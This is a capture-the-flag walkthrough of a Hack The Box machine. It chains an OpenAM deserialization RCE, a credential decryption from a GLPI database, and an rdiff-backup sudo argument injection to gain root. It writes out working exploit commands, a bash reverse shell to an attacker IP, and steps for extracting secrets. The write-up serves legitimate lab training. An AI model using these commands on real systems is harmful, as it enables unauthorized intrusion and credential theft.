# Hack The Box Machine Walkthrough Report

## 1. Reconnaissance (Recon)

During the initial phase, an `nmap` scan of the target IP address revealed the following open ports:

```bash
PORT    STATE SERVICE   REASON  VERSION
22/tcp  open  ssh       syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.19
80/tcp  open  http      syn-ack nginx 1.24.0 (Ubuntu)
443/tcp open  ssl/https syn-ack nginx/1.24.0 (Ubuntu)
```

The scan also identified the domain names `management.htb` and `sso.management.htb`. To ensure proper routing, we add them to the local `/etc/hosts` file:

```bash
echo "10.10.X.X management.htb sso.management.htb" | sudo tee -a /etc/hosts
```
*(Where `10.10.X.X` is the target machine's IP address)*

Navigating to `http://management.htb` reveals a **Client Login** button, which redirects to an OpenAM-based authentication service hosted at `https://management.htb`.

Basic attack vectors such as SQL injection and request tampering via Burp Suite yielded no results. However, inspecting the page source code and underlying application structures allowed us to fingerprint the exact platform version: **OpenAM 16.0.5**.

---

## 2. Gaining a Foothold (OpenAM RCE Exploitation)

OpenAM version 16.0.5 is vulnerable to a critical pre-authentication Remote Code Execution (RCE) flaw via unsafe Java deserialization within the `jato.clientSession` HTTP parameter (**CVE-2026-33439**).
<img width="731" height="575" alt="image" src="https://github.com/user-attachments/assets/d1fe2360-e673-4647-b339-8aed0bdd0f87" />


To verify and exploit this vulnerability, we can leverage the public standalone script available at [CVE-2026-33439-Python-PoC](https://github.com).

We execute a test command to check if the target is vulnerable:
```bash
python3 exploit.py --url https://management.htb/openam/ui/PWResetUserValidation "whoami"
```

The server returns the username under which the web application context is running:
```text
openam
```
The vulnerability is confirmed. We now proceed to spawn a Reverse Shell.

1. Start a netcat listener on the attacker machine:
   ```bash
   nc -lvnp 1337
   ```
2. Send the reverse shell payload via the exploit script:
   ```bash
   python3 exploit.py --url https://management.htb/openam/ui/PWResetUserValidation "/bin/bash -i >& /dev/tcp/10.10.14.150/1337 0>&1"
   ```
<img width="1919" height="289" alt="image" src="https://github.com/user-attachments/assets/3157bab8-94db-4df0-bfa3-9b76077b257b" />


### Reverse Shell TTY Stabilization
Once the connection is received in our netcat listener, we stabilize the terminal wrapper for a fully interactive shell session:
```bash
# Inside the remote shell session:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Press Ctrl+Z to background the shell, then on the attacker machine run:
stty raw -echo; fg

# Inside the restored shell session, set up the terminal environment:
export TERM=xterm-256color
```

---

## 3. Lateral Movement (Escalating to User `owen`)

Performing system enumeration (using `find / -type f -iname "config*" 2>/dev/null`) reveals an installation directory for the GLPI IT asset management portal under `/opt/glpi`.

Inspecting `/opt/glpi/config/config_db.php` exposes plaintext database credentials for the local MySQL/MariaDB server instance (listening on port 3306):
* **User:** `glpi`
* **Password:** `8rhu0L6Pw4Y7`
* **Database:** `glpidb`

<img width="453" height="197" alt="image" src="https://github.com/user-attachments/assets/acd8cd38-7b94-48f7-9387-a77587c53c73" />


Connect to the database instance:
```bash
mysql -u glpi -p'8rhu0L6Pw4Y7' -h 127.0.0.1 glpidb
```

By querying the available tables (`glpi_users`, `glpi_authldaps`), we find an entry in the `glpi_authldaps` table containing an encrypted password hash for a directory connection:
```sql
SELECT id, name, password FROM glpi_authldaps;
```
The string appears to be Base64-encoded, but standard decoding produces binary garbage. GLPI documentation reveals that fields are encrypted using **libsodium** (specifically the `XChaCha20-Poly1305` algorithm). The decoded 52-byte block contains a 24-byte `nonce` followed by 28 bytes of actual ciphertext. The cryptographic key required to decrypt this token is stored locally at `/opt/glpi/config/glpicrypt.key`.

We can use the target machine's native PHP CLI interpreter to decrypt the credential inline:
```bash
php -r "
\$key = file_get_contents('/opt/glpi/config/glpicrypt.key');
\$ciphertext = base64_decode('avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==');
\$nonce = substr(\$ciphertext, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
\$data = substr(\$ciphertext, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
\$plain = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(\$data, \$nonce, \$nonce, \$key);
echo \$plain . PHP_EOL;
"
```
<img width="513" height="145" alt="image" src="https://github.com/user-attachments/assets/cd750357-bdb2-4840-9a7d-9e015cfb851f" />

The decrypted cleartext password successfully grants access to the user account **owen** over SSH. We log in and capture the first flag:
```bash
ssh owen@management.htb
cat /home/owen/user.txt
```

---

## 4. Privilege Escalation (Escalating to `root`)

We check the allowed sudo privileges for our current user context:
```bash
sudo -l
```

The output indicates that the user `owen` can execute the `rdiff-backup` utility as `root` without a password, subject to a specific schema restriction:
```text
(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path *
```
<img width="868" height="230" alt="image" src="https://github.com/user-attachments/assets/4d7bfd98-3179-410b-ac46-ce0c2581d99f" />


### Exploit Mechanics (Argument Injection)
1. **Core Behavior:** When performing backup operations, `rdiff-backup` operates on a client-server architecture, executing a server process wrapper that communicates via stdin/stdout. The `--remote-schema` argument enables customization of the command string used to initialize this server process.
2. **The `%s` Placeholder:** Within the remote schema template, the string `%s` is automatically substituted by the client wrapper with the hostname parsed from arguments formatted like `host::path`.
3. **Exploitation Vector:** If we supply an intentional location string like `/::/root`, the client parses `/` as the target hostname and `/root` as the destination path. As a result, the `%s` placeholder injects a literal `/` into the final `--restrict-path %s` argument. Because `rdiff-backup` applies the final occurrence of an option to override preceding configurations, the explicit `--restrict-path /` overrides the initial `/opt/backup` constraint, granting full filesystem visibility.

Run the engineered backup command to dump the contents of the `/root` home folder into an accessible temporary location:
```bash
rdiff-backup --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" backup /::/root /tmp/root_backup
```
<img width="1765" height="378" alt="image" src="https://github.com/user-attachments/assets/0a6f4332-5a9e-4c84-8a9a-82adb7d3fce2" />

Once the backup operation completes, read the root flag directly from the mirrored output:
```bash
cat /tmp/root_backup/root.txt
```
The machine is successfully compromised.
